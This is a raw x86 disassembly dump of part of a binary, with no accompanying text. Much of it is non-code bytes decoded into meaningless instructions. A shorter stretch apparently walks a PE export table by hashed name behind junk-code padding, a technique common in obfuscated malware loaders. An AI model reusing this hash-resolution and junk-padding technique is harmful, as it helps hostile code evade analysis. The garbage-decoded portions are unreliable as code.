  41180f:	out    0x23,ax
  411812:	dec    eax
  411813:	call   0xaa323512
  411818:	jne    0x41182d
  41181a:	lds    esi,FWORD PTR [ebp+0x73]
  41181d:	lods   eax,DWORD PTR ds:[esi]
  41181e:	data16 lahf 
  411820:	ins    BYTE PTR es:[edi],dx
  411821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411822:	(bad)  
  411823:	push   ebx
  411824:	push   edx
  411825:	sbb    al,0x2f
  411827:	fild   DWORD PTR [ecx+0x22231bf8]
  41182d:	mov    cl,0x7a
  41182f:	mov    esi,0x7879
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	test   DWORD PTR [ebx+0x10],0x7e54ea6a
  411857:	jle    0x4118b2
  411859:	jg     0x4118d9
  41185b:	jle    0x411869
  41185d:	and    BYTE PTR [edx+eiz*8+0x6f],dl
  411861:	ins    BYTE PTR es:[edi],dx
  411862:	out    0xcf,eax
  411864:	fisttp QWORD PTR [edi]
  411866:	fwait
  411867:	sbb    eax,0x15a2609c
  41186c:	nop
  41186d:	pop    ebx
  41186e:	pop    DWORD PTR [esi+ebp*2]
  411871:	mov    DWORD PTR [edx+0x69],eax
  411874:	adc    edi,edx
  411876:	out    dx,al
  411877:	adc    ecx,esi
  411879:	push   ebx
  41187a:	mov    esi,0xc63d010c
  41187f:	cld    
  411880:	cmp    DWORD PTR [eax+0x3a],edx
  411883:	(bad)
  411887:	adc    DWORD PTR [esi-0x1a051c13],edx
  41188d:	rcr    DWORD PTR ds:0xf8697a04,0x32
  411894:	or     BYTE PTR [eax+0x52],al
  411897:	(bad)  
  411898:	adc    esp,esi
  41189a:	mov    ah,0xfb
  41189c:	sbb    eax,0x6932449e
  4118a1:	imul   DWORD PTR [edi+0x27]
  4118a4:	cmc    
  4118a5:	or     ebx,edx
  4118a7:	arpl   WORD PTR [esi],dx
  4118a9:	inc    edx
  4118aa:	and    al,0xfe
  4118ac:	mov    ah,0xfc
  4118ae:	mov    BYTE PTR [ecx-0x2c66a835],bh
  4118b4:	jnp    0x411902
  4118b6:	dec    eax
  4118b7:	jnp    0x411842
  4118b9:	sub    BYTE PTR [ebx],cl
  4118bb:	or     eax,0x32b07623
  4118c0:	mov    edx,0x7dc389b6
  4118c5:	cmp    al,0xe3
  4118c7:	test   BYTE PTR ds:[ecx],dl
  4118ca:	ja     0x41192c
  4118cc:	cmp    al,0xcf
  4118ce:	fcomp  st(6)
  4118d0:	lea    edx,[edx-0xf0f90ac]
  4118d6:	mov    cl,0x20
  4118d8:	arpl   WORD PTR [ecx-0x5b35f005],bp
  4118de:	dec    BYTE PTR [edi]
  4118e0:	mov    esp,0x85313036
  4118e5:	xchg   esp,eax
  4118e6:	clc    
  4118e7:	and    eax,0x2d06d0f0
  4118ec:	inc    ecx
  4118ed:	dec    eax
  4118ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ef:	pop    ecx
  4118f0:	lods   al,BYTE PTR ds:[esi]
  4118f1:	sbb    al,0x68
  4118f3:	in     eax,0x68
  4118f5:	dec    edi
  4118f6:	pop    edx
  4118f7:	icebp  
  4118f8:	outs   dx,DWORD PTR ds:[esi]
  4118f9:	ret    0xfd87
  4118fc:	mov    WORD PTR [eax-0x28],ss
  4118ff:	adc    al,0x56
  411901:	scas   al,BYTE PTR es:[edi]
  411902:	sbb    cl,dl
  411904:	adc    bl,BYTE PTR [esi]
  411906:	cmp    ecx,DWORD PTR [ebp-0x24ecdbcc]
  41190c:	inc    ecx
  41190d:	enter  0x3e89,0x36
  411911:	push   ebp
  411912:	push   esp
  411913:	sahf   
  411914:	mov    esi,0xb87c5602
  411919:	jg     0x4118ee
  41191b:	push   0xe5bb3991
  411920:	xor    DWORD PTR [ecx+0x6bc0e7c5],edx
  411926:	add    ecx,DWORD PTR [edx-0x4e610db3]
  41192c:	add    DWORD PTR [edx+0x799f0af3],0x24
  411933:	push   cs
  411934:	and    ch,al
  411936:	js     0x4118e6
  411938:	xor    bl,BYTE PTR [ebp-0x4c16dcad]
  41193e:	xor    eax,0x98f71d32
  411943:	xchg   esp,eax
  411944:	scas   al,BYTE PTR es:[edi]
  411945:	inc    ecx
  411946:	in     al,0xf6
  411948:	xchg   bh,bl
  41194a:	hlt    
  41194b:	sbb    esp,eax
  41194d:	xor    ebx,eax
  41194f:	inc    edi
  411950:	jae    0x41190e
  411952:	les    ebx,FWORD PTR [ecx]
  411954:	dec    DWORD PTR [ebx-0x77]
  411957:	mov    dl,dh
  411959:	enter  0x6621,0x8f
  41195d:	xor    eax,edi
  41195f:	arpl   WORD PTR [eax+0x67],dx
  411962:	aam    0x64
  411964:	push   edx
  411965:	sub    esi,0xea6a8cd9
  41196b:	adc    DWORD PTR [esi-0x15],0x1fc9dc00
  411972:	mov    fs:0x9d1555fb,eax
  411978:	(bad)  
  411979:	(bad)  
  41197a:	pop    eax
  41197b:	or     BYTE PTR [eax+0x6c],0x82
  41197f:	retf   0x6839
  411982:	add    DWORD PTR [eax+0x1829405f],esp
  411988:	out    dx,al
  411989:	jbe    0x41195d
  41198b:	lods   eax,DWORD PTR ds:[esi]
  41198c:	mov    esi,0x74c2efdd
  411991:	or     eax,0x96595e6f
  411996:	mov    dh,0x20
  411998:	ins    BYTE PTR es:[edi],dx
  411999:	mov    al,ds:0x6688c5e7
  41199e:	icebp  
  41199f:	je     0x4119c4
  4119a1:	leave  
  4119a2:	or     al,0xa1
  4119a4:	push   ss
  4119a5:	outs   dx,BYTE PTR ds:[esi]
  4119a6:	sbb    esp,ebp
  4119a8:	and    BYTE PTR es:[ebp+0x35],ah
  4119ac:	rcl    edx,0xfe
  4119af:	dec    ecx
  4119b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b1:	or     ch,BYTE PTR [edx]
  4119b3:	cld    
  4119b4:	(bad)  
  4119b6:	out    dx,al
  4119b7:	jle    0x41197b
  4119b9:	jp     0x411a22
  4119bb:	and    ecx,ecx
  4119bd:	test   al,0x96
  4119bf:	lods   eax,DWORD PTR ds:[esi]
  4119c0:	fs xchg ebp,eax
  4119c2:	lods   eax,DWORD PTR ds:[esi]
  4119c3:	icebp  
  4119c4:	fdivr  DWORD PTR [edi]
  4119c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c7:	mov    al,ds:0xb0b485ea
  4119cc:	call   0xa9b90e
  4119d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d2:	mov    edi,DWORD PTR [eax]
  4119d4:	dec    esi
  4119d5:	out    dx,al
  4119d6:	fldlg2 
  4119d8:	sbb    al,0x12
  4119da:	aas    
  4119db:	fwait
  4119dc:	or     edi,ebx
  4119de:	add    eax,0xe5913275
  4119e3:	das    
  4119e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119e5:	inc    ecx
  4119e6:	(bad)  
  4119e7:	dec    edx
  4119e8:	xor    eax,0x2ef55d62
  4119ed:	push   esp
  4119ee:	loope  0x411a6f
  4119f0:	out    0x42,eax
  4119f2:	imul   ebx,DWORD PTR [eax+0x795449d0],0x5d
  4119f9:	push   edx
  4119fa:	(bad)  
  4119fb:	jae    0x411a4a
  4119fd:	scas   al,BYTE PTR es:[edi]
  4119fe:	jecxz  0x4119f2
  411a00:	sub    edi,DWORD PTR [ecx+ebp*8+0x5d88461a]
  411a07:	pop    eax
  411a08:	push   esi
  411a09:	or     al,0xf4
  411a0b:	fisttp QWORD PTR [edi-0x3a9af1b0]
  411a11:	pop    ss
  411a12:	test   al,0x8a
  411a14:	ret    0xe968
  411a17:	clc    
  411a18:	sbb    BYTE PTR [edx],ah
  411a1a:	fsub   QWORD PTR [ecx-0x27]
  411a1d:	aam    0xdb
  411a1f:	call   0xff2d:0xb326e077
  411a26:	pop    ebx
  411a27:	fpatan 
  411a29:	push   ebp
  411a2a:	shl    BYTE PTR [esi+ebp*2-0x5e39dafe],1
  411a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a32:	rcr    BYTE PTR [eax+esi*4+0x33f6e687],1
  411a39:	scas   eax,DWORD PTR es:[edi]
  411a3a:	push   ecx
  411a3b:	push   0xffffff8c
  411a3d:	push   esp
  411a3e:	lahf   
  411a3f:	xchg   esi,ecx
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x4346f7
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x434677,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x43474f
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x43474f,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x4346b7,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x43467f,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x43466b,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x4346d3,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x434743,0x4346fb
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434793,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x434673,0x434667
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43478f,0x43474b
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x4346cf
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x434737,0x0
  411b01:	mov    esi,DWORD PTR ds:0x434737
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x434737,esi
  411b0e:	cmp    DWORD PTR ds:0x434737,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x434737,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x434737,0x4346f7
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x4346b7,0x434667
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x434737
  411b6a:	and    ecx,DWORD PTR ds:0x43470b
  411b70:	mov    DWORD PTR ds:0x434737,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43478f,0x13
  411b83:	cmp    DWORD PTR ds:0x43478f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43478f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434890
  411ba2:	push   0x434835
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43478f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43478f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x43466b,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x43474b,0x10
  411bd3:	cmp    DWORD PTR ds:0x43474b,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x43474b,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x434955
  411bfa:	push   0x434969
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x43474b
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x43474b,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	xchg   edx,eax
  411c72:	call   0x57162619
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411c3e
  411c7e:	xchg   edx,eax
  411c7f:	not    BYTE PTR [edx+0x49]
  411c82:	xor    DWORD PTR [eax],edx
  411c84:	pop    eax
  411c85:	mov    ah,BYTE PTR [eax-0x3ca18759]
  411c8b:	aam    0xe9
  411c8d:	xchg   ecx,eax
  411c8e:	ins    BYTE PTR es:[edi],dx
  411c8f:	cmc    
  411c90:	or     bh,BYTE PTR [edx+0x127af34c]
  411c96:	enter  0x982e,0x73
  411c9a:	adc    al,0xab
  411c9c:	imul   ebx,ebp,0x2a
  411c9f:	fild   DWORD PTR [edi]
  411ca1:	aaa    
  411ca2:	xor    ebx,DWORD PTR [ecx]
  411ca4:	jecxz  0x411d18
  411ca6:	cmp    bl,BYTE PTR [bx+di]
  411ca9:	and    eax,0xd368b845
  411cae:	fdiv   QWORD PTR [ebx-0x47]
  411cb1:	sub    bh,BYTE PTR [ecx+0x6c]
  411cb4:	out    dx,eax
  411cb5:	mov    ah,0x63
  411cb7:	or     eax,0xdc19106b
  411cbc:	imul   BYTE PTR [edi]
  411cbe:	xlat   BYTE PTR ds:[ebx]
  411cbf:	cwde   
  411cc0:	test   DWORD PTR [edi-0x544f966f],ebx
  411cc6:	dec    edx
  411cc7:	in     eax,0x10
  411cc9:	fdivrp st(7),st
  411ccb:	mov    bh,0xed
  411ccd:	push   ebp
  411cce:	sub    eax,0xe4b04e6
  411cd3:	icebp  
  411cd4:	scas   eax,DWORD PTR es:[edi]
  411cd5:	sub    bh,dh
  411cd7:	jle    0x411d45
  411cd9:	lock dec ecx
  411cdb:	cwde   
  411cdc:	inc    ecx
  411cdd:	adc    edi,eax
  411cdf:	std    
  411ce0:	daa    
  411ce1:	jmp    0x4bc72c2e
  411ce6:	push   ebx
  411ce7:	mov    ch,0x2f
  411ce9:	mov    cl,0x53
  411ceb:	mov    edi,0xe00b67c
  411cf0:	dec    ebp
  411cf1:	push   0xdfef7cb3
  411cf6:	sub    BYTE PTR [eax+0x37ce0683],dl
  411cfc:	call   FWORD PTR [edi+ebx*8+0x61]
  411d00:	sbb    BYTE PTR [ecx+eiz*4],dl
  411d03:	cmp    DWORD PTR [edx-0x625a8096],0xce1c7b40
  411d0d:	pop    ebx
  411d0e:	repz fwait
  411d10:	push   ecx
  411d11:	adc    DWORD PTR [esi+ecx*1+0x961130d],0x67aa5d97
  411d1c:	lods   eax,DWORD PTR ds:[esi]
  411d1d:	xor    esi,DWORD PTR [ebp-0x58550c4c]
  411d23:	fst    DWORD PTR [ebx-0x45]
  411d26:	jo     0x411cad
  411d28:	shl    ah,1
  411d2a:	rcr    BYTE PTR [ecx],1
  411d2c:	dec    ebp
  411d2d:	hlt    
  411d2e:	add    eax,0xec4fb379
  411d33:	mov    BYTE PTR [esi+0x68],bl
  411d36:	push   0x38
  411d38:	jo     0x411d09
  411d3a:	lea    edx,[esi+0xd7ef776]
  411d40:	sub    BYTE PTR [ebx+0x5f5f94b1],ah
  411d46:	aad    0xc1
  411d48:	gs push cs
  411d4a:	retf   
  411d4b:	or     eax,DWORD PTR [ebp+0x42]
  411d4e:	add    DWORD PTR [esi-0x6d99ed0],edx
  411d54:	test   BYTE PTR [ecx+0x40],dh
  411d57:	or     eax,DWORD PTR [esi+eax*4-0x554a5887]
  411d5e:	std    
  411d5f:	imul   BYTE PTR [esi]
  411d61:	js     0x411d0a
  411d63:	data16 adc bl,BYTE PTR [ebp-0x69cc92db]
  411d6a:	pop    edx
  411d6b:	les    edi,FWORD PTR [edi-0x28d9d4ef]
  411d71:	test   cl,ah
  411d73:	and    DWORD PTR ds:0xb73084c7,ebx
  411d79:	dec    cx
  411d7b:	cmp    DWORD PTR [ebx-0x8],eax
  411d7e:	leave  
  411d7f:	in     eax,0xcb
  411d81:	gs cmc 
  411d83:	shr    BYTE PTR [ecx+ebx*8-0x2dd9b0a5],cl
  411d8a:	shl    DWORD PTR [edi-0x608a51f1],1
  411d90:	das    
  411d91:	loope  0x411d54
  411d93:	push   esp
  411d94:	xor    eax,0x94318dff
  411d99:	push   eax
  411d9a:	cli    
  411d9b:	inc    ecx
  411d9c:	lods   eax,DWORD PTR ds:[esi]
  411d9d:	inc    ebp
  411d9e:	test   esi,ecx
  411da0:	(bad)  
  411da1:	das    
  411da2:	sub    al,0x28
  411da4:	mov    esp,0xf6a9229c
  411da9:	loope  0x411d4d
  411dab:	add    DWORD PTR [ebp-0x167539f5],ebx
  411db1:	inc    ecx
  411db2:	mov    ebx,0x999b631e
  411db7:	sub    al,0xb8
  411db9:	pop    ebp
  411dba:	pop    edx
  411dbb:	add    al,0x2a
  411dbd:	add    ebx,DWORD PTR [edx]
  411dbf:	and    al,0x60
  411dc1:	mov    bl,0x5e
  411dc3:	jge    0x411d81
  411dc5:	test   BYTE PTR [ebp-0x6b310b3d],al
  411dcb:	jge    0x411dfd
  411dcd:	or     al,0x20
  411dcf:	nop
  411dd0:	dec    esp
  411dd1:	ret    
  411dd2:	xor    esi,DWORD PTR [ecx]
  411dd4:	push   eax
  411dd5:	vprotq xmm14,xmm0,xmm5
  411dda:	dec    BYTE PTR [ebx]
  411ddc:	fadd   DWORD PTR [ecx-0x55]
  411ddf:	fldcw  WORD PTR [edx+0x56]
  411de2:	test   al,0x1b
  411de4:	icebp  
  411de5:	rcl    BYTE PTR [esi-0x15],1
  411de8:	icebp  
  411de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dea:	add    BYTE PTR [eax-0x67],0xa0
  411dee:	mov    esp,0xef00b71c
  411df3:	cmp    eax,0x5b4cad3a
  411df8:	mov    ch,0x96
  411dfa:	xor    edi,eax
  411dfc:	leave  
  411dfd:	lahf   
  411dfe:	pop    ebx
  411dff:	and    eax,DWORD PTR [ebp+0x6e561e76]
  411e05:	inc    ebx
  411e06:	or     eax,0x2ab9b040
  411e0b:	(bad)  
  411e0d:	xchg   DWORD PTR [ebx],ecx
  411e0f:	dec    esp
  411e10:	pop    ebx
  411e11:	lods   eax,DWORD PTR ds:[esi]
  411e12:	(bad)  
  411e13:	jbe    0x411e84
  411e15:	sub    ah,ch
  411e17:	fs rcr cl,cl
  411e1a:	jne    0x411dba
  411e1c:	arpl   WORD PTR [esi+0x70b4886f],sp
  411e22:	lds    ebx,FWORD PTR [edi+esi*8+0x29]
  411e26:	xlat   BYTE PTR ds:[ebx]
  411e27:	fisub  DWORD PTR [edx+0x61]
  411e2a:	pop    ebp
  411e2b:	loop   0x411dd8
  411e2d:	pop    ds
  411e2e:	mov    esi,0xdcf9d72d
  411e33:	add    BYTE PTR [edi-0x74],0xb9
  411e37:	retf   
  411e38:	pop    eax
  411e39:	(bad)  
  411e3c:	nop
  411e3d:	(bad)  
  411e3e:	loop   0x411df8
  411e40:	inc    ebx
  411e41:	jns    0x411eb1
  411e43:	mov    edx,0x79733d8f
  411e48:	das    
  411e49:	loop   0x411eac
  411e4b:	push   esi
  411e4c:	pop    ecx
  411e4d:	mov    ds:0x2223f27d,al
  411e52:	inc    edx
  411e53:	not    BYTE PTR [ebx-0x34]
  411e56:	push   esi
  411e57:	sbb    eax,DWORD PTR [ebx]
  411e59:	push   0x5
  411e5b:	das    
  411e5c:	pop    DWORD PTR [edi]
  411e5e:	mov    ecx,0xb80c0388
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	stos   DWORD PTR es:[edi],eax
  411ec0:	and    DWORD PTR ds:0x7e5030f5,ebp
  411ec6:	jle    0x411f21
  411ec8:	jg     0x411f48
  411eca:	jle    0x411f35
  411ecc:	push   0x34f5307a
  411ed1:	mov    edx,0x7a3294ba
  411ed6:	and    ebp,ebx
  411ed8:	xchg   DWORD PTR [edx],ecx
  411eda:	xor    dl,BYTE PTR [esi-0x9a4d6c5]
  411ee0:	outs   dx,BYTE PTR ds:[esi]
  411ee1:	pslld  mm4,QWORD PTR [ebp-0x69]
  411ee5:	push   ds
  411ee6:	retf   
  411ee7:	icebp  
  411ee8:	cmp    DWORD PTR [edx+ebp*2+0x7cedaf8e],edx
  411eef:	lea    ecx,[eax]
  411ef1:	cmp    al,0xec
  411ef3:	bound  ecx,QWORD PTR ds:0x79653321
  411ef9:	dec    esp
  411efa:	adc    BYTE PTR [ebx-0x38],0xa7
  411efe:	ret    0xd227
  411f01:	cwde   
  411f02:	push   ebx
  411f03:	sub    eax,esi
  411f05:	nop
  411f06:	xchg   bl,dl
  411f08:	xor    edx,DWORD PTR [esi+0x3]
  411f0b:	mov    BYTE PTR [ebp+0x15],bl
  411f0e:	and    bl,0xa6
  411f11:	cmp    ecx,DWORD PTR [eax]
  411f13:	push   esi
  411f14:	push   ebp
  411f15:	in     eax,dx
  411f16:	sbb    DWORD PTR [edi+0x2c],0x19
  411f1a:	lds    ebx,FWORD PTR [esi+0x4c3bfd92]
  411f20:	xor    dh,ah
  411f22:	xor    al,0x11
  411f24:	add    esi,esi
  411f26:	popf   
  411f27:	test   DWORD PTR [edi+0x7c],0x613a9a5d
  411f2e:	js     0x411f5b
  411f30:	jl     0x411f60
  411f32:	mov    ecx,0xf6ef32c1
  411f37:	xchg   esp,eax
  411f38:	into   
  411f39:	inc    ebx
  411f3a:	ja     0x411f34
  411f3c:	loop   0x411f48
  411f3e:	stos   DWORD PTR es:[edi],eax
  411f3f:	outs   dx,BYTE PTR ds:[esi]
  411f40:	sbb    eax,edx
  411f42:	outs   dx,DWORD PTR ds:[esi]
  411f43:	adc    esi,edx
  411f45:	mov    ds:0x730974e9,ax
  411f4b:	imul   esi,DWORD PTR ds:0xf3122cdb,0xffffffe7
  411f52:	mov    ah,BYTE PTR [ebx]
  411f54:	outs   dx,BYTE PTR ds:[esi]
  411f55:	and    BYTE PTR [ebx+ebx*1-0x16d81dec],cl
  411f5c:	ins    DWORD PTR es:[edi],dx
  411f5d:	enter  0x4656,0x87
  411f61:	lea    ebp,[eax+0x3db6e624]
  411f67:	scas   al,BYTE PTR es:[edi]
  411f68:	loop   0x411efc
  411f6a:	test   eax,0xc5606f85
  411f6f:	mov    dh,0x27
  411f71:	push   ds
  411f72:	mov    esp,0x990bbbc6
  411f77:	nop
  411f78:	cli    
  411f79:	test   DWORD PTR [esi],0x289daaa8
  411f7f:	pop    eax
  411f80:	mov    ch,0x62
  411f82:	neg    BYTE PTR [esi]
  411f84:	jp     0x411fed
  411f86:	inc    esi
  411f87:	imul   esp,DWORD PTR ds:0xf99d10c9,0xffffff9e
  411f8e:	pop    esp
  411f8f:	loop   0x411f49
  411f91:	xor    DWORD PTR [ecx],esi
  411f93:	mov    dl,0x77
  411f95:	(bad)  
  411f96:	or     BYTE PTR ds:0x1f4f662c,al
  411f9c:	out    0x75,al
  411f9e:	adc    DWORD PTR [ecx+0x214dc70b],edi
  411fa4:	push   ebp
  411fa5:	pop    ebp
  411fa6:	mov    BYTE PTR [esi],cl
  411fa8:	dec    edx
  411fa9:	pop    ebx
  411faa:	pop    edi
  411fab:	dec    edx
  411fac:	lds    ebx,FWORD PTR [eax+ecx*1-0x55]
  411fb0:	aad    0x87
  411fb2:	sti    
  411fb3:	std    
  411fb4:	stc    
  411fb5:	sub    BYTE PTR [edx+0x2d],al
  411fb8:	xchg   ecx,eax
  411fb9:	fcomip st,st(5)
  411fbb:	jb     0x411fd4
  411fbd:	out    dx,al
  411fbe:	div    bl
  411fc0:	xchg   ebx,eax
  411fc1:	add    al,BYTE PTR [ecx]
  411fc3:	das    
  411fc4:	jg     0x41201f
  411fc6:	test   BYTE PTR [edx+ebp*4],bh
  411fc9:	icebp  
  411fca:	aaa    
  411fcb:	and    BYTE PTR [ebx+0x46],bl
  411fce:	mov    ecx,0x2144eb58
  411fd3:	push   esp
  411fd4:	int3   
  411fd5:	push   ds
  411fd6:	jbe    0x411fad
  411fd8:	popa   
  411fd9:	dec    eax
  411fda:	inc    ebp
  411fdb:	cmc    
  411fdc:	popa   
  411fdd:	gs lock cli 
  411fe0:	mov    dl,0xd8
  411fe2:	jecxz  0x411fb8
  411fe4:	push   ds
  411fe5:	mov    ah,0x21
  411fe7:	pop    esp
  411fe8:	xor    esi,DWORD PTR [ebp-0x7b]
  411feb:	dec    esi
  411fec:	mov    bl,0x17
  411fee:	jmp    0x411f9c
  411ff0:	out    0x93,al
  411ff2:	loope  0x411fef
  411ff4:	ins    BYTE PTR es:[edi],dx
  411ff5:	xchg   esi,eax
  411ff6:	shl    BYTE PTR ds:[ecx-0x61f32b16],1
  411ffd:	aas    
  411ffe:	dec    esi
  411fff:	sbb    eax,0x43e78afd
  412004:	adc    esp,DWORD PTR [ebp+0x7559d7c8]
  41200a:	xor    BYTE PTR [ebx-0x18],bl
  41200d:	cmp    eax,DWORD PTR [edi-0x71ed73c8]
  412013:	push   esi
  412014:	jmp    0x65cb776f
  412019:	ins    BYTE PTR es:[edi],dx
  41201a:	sbb    al,BYTE PTR ds:0xbf670507
  412020:	sub    bl,BYTE PTR [ecx-0x6e7dda7f]
  412026:	jmp    FWORD PTR [edi]
  412028:	inc    edi
  412029:	(bad)  
  41202b:	cmp    edi,DWORD PTR [ebx-0x27]
  41202e:	out    dx,al
  41202f:	cdq    
  412030:	pop    ebp
  412031:	xchg   ecx,eax
  412032:	mov    dh,BYTE PTR [edi+0x78]
  412035:	fcom   st(3)
  412037:	add    DWORD PTR [eax+0x45],0x49caae6a
  41203e:	fstp   QWORD PTR [ecx-0x23]
  412041:	mov    bh,0x73
  412043:	out    0xa5,eax
  412045:	sbb    bl,BYTE PTR [ecx-0x57141bb9]
  41204b:	push   eax
  41204c:	mov    edi,0x1f0937a0
  412051:	xchg   edx,eax
  412052:	xor    BYTE PTR [edx-0x28],ah
  412055:	xor    dl,BYTE PTR [edi-0x354fb665]
  41205b:	fldcw  WORD PTR [esi]
  41205d:	(bad)  
  41205f:	arpl   WORD PTR [eax-0x34],dx
  412062:	(bad)  
  412063:	repnz hlt 
  412065:	fisubr WORD PTR [esi]
  412067:	jmp    0x5866a82d
  41206c:	inc    eax
  41206d:	dec    edi
  41206e:	push   eax
  41206f:	test   al,cl
  412071:	inc    BYTE PTR [edx-0x59]
  412074:	aaa    
  412075:	data16 test BYTE PTR [eax-0x744b7913],al
